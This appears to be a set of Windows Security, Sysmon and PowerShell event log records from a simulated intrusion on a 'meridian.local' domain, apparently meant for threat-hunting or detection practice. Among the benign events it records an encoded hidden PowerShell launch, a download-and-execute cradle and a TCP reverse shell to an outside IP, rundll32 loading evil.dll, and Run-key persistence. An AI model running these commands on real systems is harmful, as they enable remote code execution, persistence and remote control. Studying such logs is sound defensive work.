{"Event":{"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-a5ba-3e3b0328c30d"}},"EventID":4688,"Level":0,"Task":13312,"Channel":"Security","Computer":"WIN-DC01.meridian.local","TimeCreated":{"#attributes":{"SystemTime":"2026-03-04T08:03:12.114Z"}}},"EventData":{"SubjectUserName":"jdoe","NewProcessName":"C:\\Windows\\System32\\notepad.exe","CommandLine":"notepad.exe C:\\Users\\jdoe\\notes.txt","ParentProcessName":"C:\\Windows\\explorer.exe"}}}
{"Event":{"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-a5ba-3e3b0328c30d"}},"EventID":4688,"Level":0,"Task":13312,"Channel":"Security","Computer":"WIN-DC01.meridian.local","TimeCreated":{"#attributes":{"SystemTime":"2026-03-04T08:07:44.502Z"}}},"EventData":{"SubjectUserName":"jdoe","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA","ParentProcessName":"C:\\Windows\\System32\\wscript.exe"}}}
{"Event":{"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-Sysmon","Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"}},"EventID":1,"Level":4,"Task":1,"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WIN-WKS07.meridian.local","TimeCreated":{"#attributes":{"SystemTime":"2026-03-04T08:09:01.877Z"}}},"EventData":{"Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c whoami /all","User":"MERIDIAN\\svc_backup","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"powershell.exe -ExecutionPolicy Bypass -File update.ps1"}}}
{"Event":{"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-Sysmon","Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"}},"EventID":3,"Level":4,"Task":3,"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WIN-WKS07.meridian.local","TimeCreated":{"#attributes":{"SystemTime":"2026-03-04T08:11:38.221Z"}}},"EventData":{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","DestinationIp":"185.220.101.7","DestinationPort":443,"Protocol":"tcp","User":"MERIDIAN\\svc_backup"}}}
{"Event":{"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"a0c1853b-5c40-4b15-8766-3cf1c58f985a"}},"EventID":4104,"Level":3,"Task":2,"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"WIN-WKS07.meridian.local","TimeCreated":{"#attributes":{"SystemTime":"2026-03-04T08:12:19.640Z"}}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.7/a.ps1')","ScriptBlockId":"7d1b2c3a-0001-4a5b-9c1d-0e2f3a4b5c6d"}}}
{"Event":{"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"a0c1853b-5c40-4b15-8766-3cf1c58f985a"}},"EventID":4104,"Level":5,"Task":2,"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"WIN-WKS07.meridian.local","TimeCreated":{"#attributes":{"SystemTime":"2026-03-04T08:13:05.109Z"}}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Get-Process | Sort-Object CPU -Descending | Select-Object -First 5","ScriptBlockId":"7d1b2c3a-0002-4a5b-9c1d-0e2f3a4b5c6d"}}}
{"Event":{"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"a0c1853b-5c40-4b15-8766-3cf1c58f985a"}},"EventID":4104,"Level":3,"Task":2,"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"WIN-WKS07.meridian.local","TimeCreated":{"#attributes":{"SystemTime":"2026-03-04T08:15:52.383Z"}}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($p)) | IEX","ScriptBlockId":"7d1b2c3a-0003-4a5b-9c1d-0e2f3a4b5c6d"}}}
{"Event":{"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-a5ba-3e3b0328c30d"}},"EventID":4624,"Level":0,"Task":12544,"Channel":"Security","Computer":"WIN-DC01.meridian.local","TimeCreated":{"#attributes":{"SystemTime":"2026-03-04T08:16:20.744Z"}}},"EventData":{"TargetUserName":"jdoe","LogonType":2,"IpAddress":"10.4.12.30","WorkstationName":"WIN-WKS02"}}}
{"Event":{"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-Sysmon","Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"}},"EventID":1,"Level":4,"Task":1,"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WIN-WKS07.meridian.local","TimeCreated":{"#attributes":{"SystemTime":"2026-03-04T08:18:47.020Z"}}},"EventData":{"Image":"C:\\Windows\\System32\\rundll32.exe","CommandLine":"rundll32.exe C:\\Users\\svc_backup\\AppData\\Local\\Temp\\evil.dll,Start","User":"MERIDIAN\\svc_backup","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"powershell.exe -ExecutionPolicy Bypass -File update.ps1"}}}
{"Event":{"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-a5ba-3e3b0328c30d"}},"EventID":4688,"Level":0,"Task":13312,"Channel":"Security","Computer":"WIN-WKS02.meridian.local","TimeCreated":{"#attributes":{"SystemTime":"2026-03-04T08:20:33.556Z"}}},"EventData":{"SubjectUserName":"jdoe","NewProcessName":"C:\\Program Files\\Git\\bin\\git.exe","CommandLine":"git.exe status","ParentProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event":{"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"a0c1853b-5c40-4b15-8766-3cf1c58f985a"}},"EventID":4104,"Level":5,"Task":2,"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"WIN-WKS02.meridian.local","TimeCreated":{"#attributes":{"SystemTime":"2026-03-04T08:22:10.918Z"}}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Test-Connection -ComputerName dc01 -Count 1","ScriptBlockId":"7d1b2c3a-0004-4a5b-9c1d-0e2f3a4b5c6d"}}}
{"Event":{"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-Sysmon","Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"}},"EventID":1,"Level":4,"Task":1,"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WIN-WKS02.meridian.local","TimeCreated":{"#attributes":{"SystemTime":"2026-03-04T08:24:10.402Z"}}},"EventData":{"Image":"C:\\Windows\\System32\\reg.exe","CommandLine":"reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d powershell.exe -w hidden","User":"MERIDIAN\\jdoe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd.exe /c reg add ..."}}}
{"Event":{"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-a5ba-3e3b0328c30d"}},"EventID":4688,"Level":0,"Task":13312,"Channel":"Security","Computer":"WIN-WKS02.meridian.local","TimeCreated":{"#attributes":{"SystemTime":"2026-03-04T08:26:55.311Z"}}},"EventData":{"SubjectUserName":"jdoe","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe Get-ChildItem C:\\Users -Recurse -Filter *.docx","ParentProcessName":"C:\\Windows\\explorer.exe"}}}
{"Event":{"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-Sysmon","Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"}},"EventID":3,"Level":4,"Task":3,"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WIN-WKS02.meridian.local","TimeCreated":{"#attributes":{"SystemTime":"2026-03-04T08:29:41.667Z"}}},"EventData":{"Image":"C:\\Program Files\\Git\\bin\\git.exe","DestinationIp":"140.82.113.3","DestinationPort":443,"Protocol":"tcp","User":"MERIDIAN\\jdoe"}}}
{"Event":{"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"a0c1853b-5c40-4b15-8766-3cf1c58f985a"}},"EventID":4104,"Level":3,"Task":2,"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"WIN-WKS07.meridian.local","TimeCreated":{"#attributes":{"SystemTime":"2026-03-04T08:31:18.245Z"}}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$c = New-Object System.Net.Sockets.TCPClient('185.220.101.7',4444); $s = $c.GetStream()","ScriptBlockId":"7d1b2c3a-0005-4a5b-9c1d-0e2f3a4b5c6d"}}}
